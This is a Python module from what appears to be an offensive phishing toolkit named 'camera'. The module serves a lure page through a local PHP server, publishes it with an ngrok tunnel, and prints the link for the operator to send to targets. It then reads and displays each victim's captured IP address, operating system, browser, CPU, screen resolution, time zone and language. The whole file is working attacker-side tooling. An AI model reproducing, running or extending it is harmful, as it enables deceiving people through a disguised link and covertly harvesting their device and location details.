# @x_darkpy_x
from pyngrok import ngrok
from colorama import Fore
from subprocess import Popen
import sys
import time
import json
import os

class camera:
 
  my_file = open("./module/camera/info.json","w")
  my_file.write("") 
  my_file.close()
  
  len_file = None
  
    
  def server(self):
    with open("server","w") as log:
      Popen(("php","-S","localhost:9090","-t","./module/camera"),stderr=log,stdout=log)
      
      
  def run_ngrok(self):
    try:
      self.server()
      
      url = ngrok.connect('9090','http').replace('http','https')
      time.sleep(0.1)
      print(Fore.RED+"\n [ "+Fore.YELLOW+"please Wait ... "+Fore.RED+"]")
      time.sleep(0.3)
      print(Fore.RED+"\n [ "+Fore.LIGHTCYAN_EX+"Your URL"+Fore.LIGHTYELLOW_EX+" : >> "+Fore.LIGHTBLUE_EX+url+Fore.RED+" ]")
      time.sleep(0.2)
      print(Fore.RED+"\n [ "+Fore.LIGHTGREEN_EX+"Help in the "+Fore.LIGHTYELLOW_EX+"help"+Fore.LIGHTGREEN_EX+" section"+Fore.LIGHTGREEN_EX+" :)"+Fore.RED+" ]")
    
    except KeyboardInterrupt:
      Popen(("pkill","php"),stderr=None,stdout=None)
      sys.exit()
      
      
  def info(self):
    self.run_ngrok()
    while True:
      try:
        File = 0
        if not os.stat("./module/camera/info.json").st_size == File:
          File = str(os.stat("./module/camera/info.json").st_size)
          len_file = open("./module/camera/info.json","r")
          mydata = len_file.read()
      
          try:
            Data = json.loads(mydata)
            for vlu in Data['dev']:
              
              print(Fore.WHITE+"\n     [ "+Fore.LIGHTBLUE_EX+"Os Name"+Fore.WHITE+" : >> "+Fore.YELLOW+vlu['Os-Name']+Fore.WHITE+" ] ")
              print(Fore.WHITE+"\n     [ "+Fore.LIGHTBLUE_EX+"Os Version"+Fore.WHITE+" : >> "+Fore.YELLOW+vlu['Os-Version']+Fore.WHITE+" ] ")
              print(Fore.WHITE+"\n     [ "+Fore.LIGHTBLUE_EX+"Os Ip"+Fore.WHITE+" : >> "+Fore.YELLOW+vlu['Os-Ip']+Fore.WHITE+" ] ")
              print(Fore.WHITE+"\n     [ "+Fore.LIGHTBLUE_EX+"CPU Core"+Fore.WHITE+" : >> "+Fore.YELLOW+vlu['CPU-Core']+Fore.WHITE+" ] ")
              print(Fore.WHITE+"\n     [ "+Fore.LIGHTBLUE_EX+"Browser Name"+Fore.WHITE+" : >> "+Fore.YELLOW+vlu['Browser-Name']+Fore.WHITE+" ] ")
              print(Fore.WHITE+"\n     [ "+Fore.LIGHTBLUE_EX+"Browser Version"+Fore.WHITE+" : >> "+Fore.YELLOW+vlu['Browser-Version']+Fore.WHITE+" ] ")
              print(Fore.WHITE+"\n     [ "+Fore.LIGHTBLUE_EX+"CPU Architecture"+Fore.WHITE+" : >> "+Fore.YELLOW+vlu['CPU-Architecture']+Fore.WHITE+" ] ")
              print(Fore.WHITE+"\n     [ "+Fore.LIGHTBLUE_EX+"Resolution"+Fore.WHITE+" : >> "+Fore.YELLOW+vlu['Resolution']+Fore.WHITE+" ] ")
              print(Fore.WHITE+"\n     [ "+Fore.LIGHTBLUE_EX+"Time Zone"+Fore.WHITE+" : >> "+Fore.YELLOW+vlu['Time-Zone']+Fore.WHITE+" ] ")
              print(Fore.WHITE+"\n     [ "+Fore.LIGHTBLUE_EX+"Language"+Fore.WHITE+" : >> "+Fore.YELLOW+vlu['Language']+Fore.WHITE+" ] ")
              print(Fore.RED+"\n     [ "+Fore.LIGHTCYAN_EX+"Coded By Sepehr :)"+Fore.RED+" ] \n")
              my_file = open("./module/camera/info.json","w")
              my_file.write("") 
              my_file.close()
          except:
            print("")
      except KeyboardInterrupt:
        Popen(("pkill","php"),stderr=None,stdout=None)
        sys.exit()
          
         
         
         

#camera().run_ngrok()
#camera().info()